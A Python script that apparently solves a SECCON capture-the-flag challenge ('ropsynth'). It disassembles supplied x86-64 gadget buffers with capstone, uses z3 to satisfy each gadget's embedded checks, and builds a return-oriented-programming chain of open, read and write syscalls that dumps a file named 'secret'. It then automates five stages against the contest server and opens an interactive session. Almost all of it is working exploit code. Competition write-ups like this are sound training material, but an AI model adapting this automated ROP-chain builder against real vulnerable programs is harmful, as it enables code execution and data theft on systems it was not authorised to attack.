import capstone
import z3
import subprocess
from struct import pack

ADDRESS = 0x00800000 # This is where the rop buffer lives
BUFADDR = 0x00a00000 # This is an r/w buffer for you, helpfully initialized
                     # to "secret\x00", which is the name of the file you read.

def solve_instance(gadget_buf):
  gadget_buf = gadget_buf.decode('base64')
  md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
  md.skipdata = False
  disasm = list(md.disasm_lite(gadget_buf, ADDRESS))
  addrtable = {x[0]:i for i, x in enumerate(disasm)}

  # Step 1: Find `instr`, and parse out the successor instructions
  # until a `ret` is hit (assuming we meet all the `je` checks to
  # avoid running into the `hlt`s)
  def get_gadget(instr):
    instr = instr.strip()
    for start, x in enumerate(disasm):
      if ('%s %s' % (x[2], x[3])).strip() == instr:
        break
    else:
      assert False

    gadget = []
    end = start
    while True:
      gadget.append(disasm[end])
      if disasm[end][2] == 'je':
        end = addrtable[int(disasm[end][3], 16)]
      elif disasm[end][2] == 'ret':
        break
      elif disasm[end][2] == 'hlt':
        assert False
      else:
        end += 1

    return gadget

  syscall = get_gadget('syscall')
  poprdx = get_gadget('pop rdx')
  poprdi = get_gadget('pop rdi')
  poprsi = get_gadget('pop rsi')
  poprax = get_gadget('pop rax')

  # for i in disasm:
  #   print '%x %s %s' % (i[0], i[2], i[3])
  # print '----------'
  # for i in poprsi:
  #   print '%x %s %s' % (i[0], i[2], i[3])

  # Step 2: Figure out the values needed to pass checks.
  # Checks take the following form:
  #   pop reg0
  #   (add|sub|xor) reg0, $constant
  #   <repeat a few times>
  #   cmp reg0, $constant
  #   je check_passed
  #   hlt
  #   ...
  #   check_passed: <either ret, or another check>
  def pass_checks(instrs, skip=1):
    pushes = []
    idx = skip
    while True:
      assert instrs[idx][2] == 'pop'
      reg = instrs[idx][3]
      idx += 1

      # Note: You don't actually need z3 for this. Each operation
      # is trivially invertible, so all you'd have to do is run
      # through the instructions backwards. BUT Z3 EZ & I AM LAZY.
      symb_reg = z3.BitVec(reg, 64)
      x = symb_reg

      while True:
        mnem = instrs[idx][2]
        args = instrs[idx][3].split(', ')
        idx += 1
        assert len(args) == 2
        assert args[0] == reg
        if mnem == 'add':
          x += int(args[1], 0)
        elif mnem == 'sub':
          x -= int(args[1], 0)
        elif mnem == 'xor':
          x ^= int(args[1], 0)
        elif mnem == 'cmp':
          s = z3.Solver()
          s.add(x == int(args[1], 0))
          s.check()
          pushes.append(s.model()[symb_reg].as_long())
          break
        else:
          assert False

      assert instrs[idx][2] == 'je'
      idx += 1
      if instrs[idx][2] == 'ret':
        break
    return pushes

  # Helper funcs to generate the rop needed to call specific gadgets
  def set_rax(x):
    return [poprax[0][0]] + [x] + pass_checks(poprax)
  def set_rdi(x):
    return [poprdi[0][0]] + [x] + pass_checks(poprdi)
  def set_rsi(x):
    return [poprsi[0][0]] + [x] + pass_checks(poprsi)
  def set_rdx(x):
    return [poprdx[0][0]] + [x] + pass_checks(poprdx)
  def do_syscall():
    return [syscall[0][0]] + pass_checks(syscall)
  # The `pop rdi` and `pop rdx` gadgets have a `push rax` before them
  def mov_rdi_rax():
    prev = disasm[addrtable[poprdi[0][0]-1]]
    assert prev[2:4] == ('push', 'rax')
    return [prev[0]] + pass_checks(poprdi)
  def mov_rdx_rax():
    prev = disasm[addrtable[poprdx[0][0]-1]]
    assert prev[2:4] == ('push', 'rax')
    return [prev[0]] + pass_checks(poprdx)

  # Linux syscalls
  sys_open = 2
  sys_read = 0
  sys_write = 1
  sys_exit_group = 231

  # Step 3: The rop chain.
  concat = [
    set_rax(sys_open),
    set_rdi(BUFADDR),
    set_rsi(0),
    do_syscall(),

    mov_rdi_rax(),
    set_rax(sys_read),
    set_rsi(BUFADDR),
    set_rdx(100),
    do_syscall(),

    mov_rdx_rax(),
    set_rax(sys_write),
    set_rdi(1),
    do_syscall(),

    set_rdi(0),
    set_rax(sys_exit_group),
    do_syscall(),
  ]
  rop = ''.join(pack('<Q', k) for k in (j for i in concat for j in i))
  return rop.encode('base64').replace('\n', '')

# gadget_bufs = [open('./gadgets-examples/out01.txt').read(), open('./gadgets-examples/out02.txt').read(), open('./gadgets-examples/out03.txt').read(), open('./gadgets-examples/out04.txt').read(), open('./gadgets-examples/out05.txt').read()]
# solve_instance(gadget_bufs[0].encode('base64'))
# exit(0)
# print solve_instance(subprocess.check_output(('pbpaste',)))
# exit(0)

import socket

sock = socket.create_connection(('ropsynth.pwn.seccon.jp', 10000))
f = sock.makefile('rw')

import sys
def readline():
  line = f.readline()
  sys.stdout.write(line)
  return line

def write(s):
  sys.stdout.write(s)
  f.write(s)
  f.flush()

for i in range(5):
  t = readline()
  assert t == "stage %d/5\n" % (i+1)

  write(solve_instance(readline()))
  write('\n')
  t = readline()
  assert t == "OK\n"

import telnetlib
t = telnetlib.Telnet()
t.sock = sock
t.interact()
